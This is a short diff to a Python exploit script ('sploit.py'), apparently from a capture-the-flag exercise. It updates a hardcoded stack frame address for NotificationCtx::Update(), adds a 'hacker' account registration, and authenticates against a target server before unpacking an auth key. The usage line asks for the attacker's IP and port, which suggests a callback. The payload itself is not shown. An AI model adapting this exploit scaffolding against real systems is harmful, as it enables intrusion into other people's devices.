@@ -11,15 +11,21 @@ SERVER_ADDR = "10.60.3.2"
 # value of 'sp' register at the very beginning of NotificationCtx::Update(),
 # before 'push {r4, r5, r6, r7, pc}' instruction,
 # ie start address of stack frame of NotificationCtx::Update()
-STACK_FRAME_START = 0x2000DCF8
+STACK_FRAME_START = 0x2000ece8
+USERNAME = 'hacker'
+PASSWORD = '0000'
 
 if len(argv) != 3:
     print("usage: ./sploit.py <this host ip address> <port>")
     exit(1)
 
-url = 'http://%s/auth' % (SERVER_ADDR)
+url = 'http://%s/register?u=%s&p=%s' % (SERVER_ADDR, USERNAME, PASSWORD)
+r = requests.get(url)
+
+url = 'http://%s/auth?u=%s&p=%s' % (SERVER_ADDR, USERNAME, PASSWORD)
 r = requests.get(url)
 if r.status_code != 200:
+    print("%s failed: %u" % (url, r.status_code))
     exit(1)
 authKey = struct.unpack('I', r.content)[0]
 
